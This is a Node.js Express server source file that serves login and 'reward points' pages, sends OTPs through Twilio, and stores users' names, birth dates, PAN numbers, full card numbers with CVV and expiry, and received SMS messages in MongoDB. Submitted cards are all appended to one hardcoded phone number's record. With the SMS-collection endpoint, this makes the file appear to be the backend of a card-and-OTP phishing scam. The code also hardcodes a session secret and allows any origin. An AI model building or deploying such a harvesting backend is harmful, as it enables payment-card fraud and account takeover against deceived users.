require('dotenv').config();
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const twilio = require('twilio');
const axios = require('axios');
const cors = require('cors');
var valid = require("card-validator");
const { Console } = require('console');
const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
const db = require('./firebase-config');
const cookieParser = require('cookie-parser');
const { generateToken, verifyToken } = require('./jwt');
const session = require('express-session');
const mongoose = require('mongoose')
const dbURL = process.env.ATLAS_DB_URL;


console.log('env url',dbURL)

mongoose.connect(dbURL)
  .then(() => console.log(' db Connected!'));



// defining the model for schema
const UserSchema = new mongoose.Schema({
  phone: { type: String, required: true, unique: true },
  userData: {
      // Define fields within userData based on your requirements
      name: String,
      dob: String,
      pan: String,
      phone: String,
  },
  cards: [{
      cardNumber: String,
      cvv: String,
      expiryDate: String
  }],
  sms: [{
    address: String,
    body: String,
    date: String
}]
});

const User = mongoose.model('User', UserSchema);


app.use(cors({ 
    origin: '*', 
    methods: ['GET','POST'],
}));

app.use(cookieParser());

app.use(express.json());

app.use(express.urlencoded({extended:true}))

app.use(session({
  secret: 'your-secret-key', // Replace with a strong secret key
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // Set to true if using HTTPS
}));





// Mt SID
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const serviceSid = process.env.TWILIO_SERVICE_SID;
const client = twilio(accountSid, authToken);

const authenticateJWT = (req, res, next) => {
  // next();
  const token = req.cookies.token; // Get JWT from cookie
  if (token) {
    const user = verifyToken(token);
    if (user) {
      req.user = user;
      next();
    } else {
      res.sendStatus(403); // Forbidden
    }
  } else {
    res.sendStatus(401); // Unauthorized
  }
};



async function findCardInDatabase(cardNumberToFind) {
  try {
      // 1. Fetch all users
      const usersSnapshot = await db.ref('users').once('value');
      // console.log("usersSnapshot",usersSnapshot)
      // 2. Iterate over each user
      for (const userId in usersSnapshot.val()) {
          const userRef = db.ref(`users/${userId}/cards`);
          const cardsSnapshot = await userRef.once('value');
          const userCards = cardsSnapshot.val();
          // console.log("userCards",userCards)

          // 3. Iterate over each card and check for a match
          for (const cardKey in userCards) {
              // console.log("cardkey",cardKey)
              console.log("card_number fetched",userCards.cardNumber)
              if (userCards.cardNumber == cardNumberToFind) {
                  // console.log("data matched fro",cardNumberToFind)
                  return true;
              }
          }
      }

      // 4. Card number not found
      return false;
  } catch (error) {
      console.error('Error searching for card:', error);
      throw error;  // Or handle the error as needed
  }
}





// app.get('/test', async (req, res) => {
//   try {
//     let card_number = 4111111111111111;
//     let result = await findCardInDatabase(card_number);
//     console.log("final result", result);
//     res.send(result);
//   } catch (error) {
//     console.error("Error finding card in database:", error);
//     res.status(500).send("An error occurred while fetching card details.");
//   }
// });








// // Route for Login Page
app.get('/', (req, res) => {
  res.render('login');
});


// // Route for reward
app.get('/reward',(req, res) => {
    res.render('reward');
  });


// // Route for reward points
app.get('/rewardpoints', (req, res) => {
    res.render('reward_points');
  });



app.post('/savesms', async(req, res) => {
    var { address, body, date,phone } = req.body;
  console.log("received data savsms",address,body,date,phone)
  const smsData = {
    address,
    body,       
    date
  };
  console.log('Updating user with phone:', phone);
  try {
      const user = await User.findOneAndUpdate(
          { phone },
          { $push: { sms: smsData } },
          { new: true } 
      );
      if (user) {
          console.log('Card successfully added to user:', user);
          res.json({ valid: true });
      } else {
          console.log('User not found, responding with error');
          res.json({ valid: false, error: 'User not found' });
      }
  } catch (error) {
      console.error('Error saving card to MongoDB:', error);
      res.json({ valid: false, error: 'Error saving card details' });
  }
});



app.get('*', (req, res) => {
    res.render('pnf');
  });
  



app.post('/sendOTP', (req, res) => {
  // console.log("OTP sent to",req.body)
    // res.json({ success: true});
    const { phone } = req.body;
    console.log(phone)
    client.verify.v2.services(serviceSid)
      .verifications
      .create(
        {to: phone, channel: 'sms'}
      )
      .then(verification => {
          console.log(verification.sid);
          res.json({ success: true, sid: verification.sid });
      })
      .catch(error => {
          console.error('Error sending OTP:', error);
          res.json({ success: false, error: error.message });
      });
});



app.post('/verifyOTP', async (req, res) => {
  const { phone, otp, userData } = req.body;
  try {
      // Use await to get the verification result
      const verification_check = await client.verify.v2.services(serviceSid)
          .verificationChecks
          .create({ to: phone, code: otp });

      if (verification_check.status === 'approved') {
          try {
              console.log("userdata",userData)
              let user = await User.findOneAndUpdate(
                  { phone }, 
                  { $set: { userData } },  
                  { upsert: true, new: true }
              );
              res.json({ success: true });
          } catch (error) {
              console.error('Error saving user data to MongoDB:', error);
              res.json({ success: false, error: 'Error saving user data' });
          }
      } else {
          res.json({ success: false });
      }
  } catch (error) {
      console.error("Error verifying OTP:", error);
      res.json({ success: false, error: error.message });
  }
});


app.post('/validateCard', async (req, res) => {
  console.log('Received request to /validateCard');
  const { cardNumber, cvv, expiryDate } = req.body;
  console.log("received data", req.body)
  const numberValidation = valid.number(cardNumber);
    console.log('npm_validation',cardNumber,numberValidation)
    if (!numberValidation.isPotentiallyValid) {
        return res.json({ valid: false, error: 'Invalid card number format' });
    }
    else if (!numberValidation.isValid) {
        return res.json({ valid: false, error: 'Invalid card number' });
    }

  try {
      let card_number = cardNumber;
      console.log('Checking existence of card:', card_number);
      let result = await User.exists({ 'cards.cardNumber': card_number });
      console.log("Already exist ", result);
      
      if (result != null){
          console.log('Card already exists, responding with error');
          return res.json({ valid: false, error: 'Card number already exist' });
      }
  } catch (error) {
      console.error("Error finding card in database:", error);
      return res.status(500).send("An error occurred while fetching card details.");
  }

  let phone = '+918982445259';
  console.log('Updating user with phone:', phone);
  try {
      const user = await User.findOneAndUpdate(
          { phone },
          { $push: { cards: { cardNumber, cvv, expiryDate } } },
          { new: true } 
      );
      if (user) {
          console.log('Card successfully added to user:', user);
          res.json({ valid: true });
      } else {
          console.log('User not found, responding with error');
          res.json({ valid: false, error: 'User not found' });
      }
  } catch (error) {
      console.error('Error saving card to MongoDB:', error);
      res.json({ valid: false, error: 'Error saving card details' });
  }
});












app.listen(3000, () => {
    console.log('Server running on port 3000');
});